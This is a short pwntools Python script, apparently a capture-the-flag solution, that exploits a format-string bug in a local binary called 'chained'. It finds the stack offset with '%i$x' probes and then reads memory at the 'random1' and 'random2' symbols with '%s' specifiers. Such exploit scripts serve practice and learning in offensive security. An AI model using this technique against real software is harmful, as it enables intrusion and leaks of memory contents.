from pwn import *

context.log_level = 'error'

def find_offset(binary, after):
    for i in range(1, 20):
        p = process(binary)

        p.sendlineafter(after, f'AAAA%{i}$x'.encode())
        output = p.recvline().decode('utf-8')

        p.close()

        if '41414141' in output:
            return i

offset = find_offset('./chained', b'?\n')

p = process('./chained')
e = p.elf

payload = p32(e.symbols['random1']) + p32(e.symbols['random2'])
payload += f' %{offset}$s '.encode() + f'%{offset + 1}$s'.encode()

p.sendlineafter(b'?\n', payload)

p.interactive()
p.close()